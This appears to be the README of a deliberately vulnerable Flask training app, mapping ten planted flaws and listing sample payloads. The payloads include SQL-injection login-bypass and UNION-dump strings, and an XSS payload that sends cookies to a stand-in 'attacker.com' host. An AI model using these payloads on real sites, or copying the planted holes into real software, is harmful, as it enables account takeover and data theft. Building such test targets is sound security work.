# VulnCorp — Deliberately Vulnerable Flask App
### For local security scanner / OWASP_Guardian testing only

---

## ⚠️  WARNING
This application is **intentionally insecure**. Never deploy it on a public
server or expose it to untrusted networks.

---

## Quick Start

```bash
pip install flask
python app.py
# → http://127.0.0.1:5001
```

---

## Vulnerability Map

| ID | Route(s) | Vulnerability | How to Trigger |
|----|----------|---------------|----------------|
| VULN-01 | `/`, `/search`, `/comment` | **Reflected & Stored XSS** | `/?name=<script>alert(1)</script>` |
| VULN-02 | `/login`, `/search` | **SQL Injection** | Username: `' OR '1'='1' --` |
| VULN-03 | `/login`, `/admin` | **Broken Authentication** | Default creds `admin/admin123`, hardcoded secret key |
| VULN-04 | All routes | **Missing Security Headers** | Inspect response headers — no CSP, X-Frame-Options, etc. |
| VULN-05 | `/upload` | **Insecure File Upload** | Upload a `.php`, `.py`, or `.sh` file |
| VULN-06 | `/admin` | **Broken Access Control** | `/admin?admin=1` bypasses auth entirely |
| VULN-07 | `/redirect` | **Open Redirect** | `/redirect?url=https://evil.com` |
| VULN-08 | (server) | **Debug Mode On** | Flask `debug=True` exposes Werkzeug console |
| VULN-09 | `/debug-info`, `/api/users` | **Sensitive Data Exposure** | Visit `/debug-info` or `/api/users` unauthenticated |
| VULN-10 | All forms | **CSRF** | No CSRF token on any form |

---

## SQLi Payloads

```
# Auth bypass (login form)
Username: ' OR '1'='1' --
Password: anything

# UNION dump of users table (search box)
' UNION SELECT username, password, role FROM users--
```

## XSS Payloads

```
# Reflected (query param)
http://127.0.0.1:5001/?name=<script>alert(document.cookie)</script>

# Stored (comment board)
<script>document.location='http://attacker.com?c='+document.cookie</script>
```

---

## File Structure

```
vulnerable_app/
├── app.py           ← main application
├── requirements.txt
├── uploads/         ← created at runtime (uploaded files land here)
└── vuln_test.db     ← SQLite DB created at first run
```
